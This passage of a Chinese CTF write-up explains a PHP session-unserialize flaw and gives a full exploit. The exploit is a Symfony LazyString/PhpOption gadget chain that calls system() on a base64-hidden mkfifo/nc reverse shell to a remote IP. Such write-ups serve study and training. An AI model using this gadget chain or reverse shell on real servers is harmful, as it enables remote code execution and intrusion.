class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PhpSession</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IFormat</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$k</span> . <span class="hljs-string">&#x27;|&#x27;</span> . serialize(<span class="hljs-variable">$v</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$result</span> = [];<br>        <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$length</span> = \strlen(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$offset</span> &lt; <span class="hljs-variable">$length</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!strstr(substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>), <span class="hljs-string">&#x27;|&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> [];<br>            &#125;<br>            <span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$offset</span>);<br>            <span class="hljs-variable">$num</span> = <span class="hljs-variable">$pos</span> - <span class="hljs-variable">$offset</span>;<br>            <span class="hljs-variable">$varname</span> = substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>, <span class="hljs-variable">$num</span>);<br>            <span class="hljs-variable">$offset</span> += <span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$dataItem</span> = unserialize(substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>));<br>            <span class="hljs-variable">$result</span>[<span class="hljs-variable">$varname</span>] = <span class="hljs-variable">$dataItem</span>;<br>            <span class="hljs-variable">$offset</span> += \strlen(serialize(<span class="hljs-variable">$dataItem</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>例如我们插入的数据，从结果上看明显反序列化出来了我们的<code>[]</code></p>
+<p><img src="https://img-blog.csdnimg.cn/e49909403b2149d5bf44fae81aa02f74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>接下来就是找链子，最开始我想的是这不就直接<code>LazyString</code>中触发<code>toString</code>，参数赋值一个闭包函数。后来一直没通，发现我是憨批，它这里不和上面文件上传那个一样，因为上面的实现了对于闭包函数的序列化，这里无法对闭包函数进行序列化，所以无法将参数初始化。最终exp（这里还有个坑就是它是sh命令的架构，不能用bash反弹shell）：</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PhpOption</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Option</span>&#123;<br><br>        &#125;<br>    <span class="hljs-title">final</span> <span class="hljs-title">class</span> <span class="hljs-title">LazyOption</span> <span class="hljs-title">extends</span> <span class="hljs-title">Option</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">callback</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$arguments</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$option</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;arguments = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMzkuMTA3LjIzOS4zMCAyMzMzID4vdG1wL2YK | base64 -d|sh&quot;</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;callback = <span class="hljs-string">&quot;system&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">PhpOption</span>\<span class="hljs-title">LazyOption</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyString</span> </span>&#123;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;value = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> LazyOption(),<span class="hljs-string">&quot;get&quot;</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>	$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>\<span class="hljs-title">LazyString</span>();<br>	<span class="hljs-variable">$p</span> = serialize(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$payload</span>  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;e&quot;</span>=&gt;<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c|&quot;</span>.<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;a&quot;</span>=&gt;<span class="hljs-string">&quot;a&quot;</span>);<br>    <span class="hljs-comment">// var_dump($payload).&quot;\n&quot;;</span><br>    <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$payload</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/32ee3c5527be4ccfb52df760be15b3ac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/12/2022-1-12-JNDI%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">JNDI学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP证123456号
+      </a>
+    </span>
+    
+      
+        <span>
+          <a
+            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+            rel="nofollow noopener"
+            class="beian-police"
+            target="_blank"
+          >
+            
+              <span style="visibility: hidden; width: 0">|</span>
+              <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+            
+            <span>京公网安备12345678号</span>
+          </a>
+        </span>
+      
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
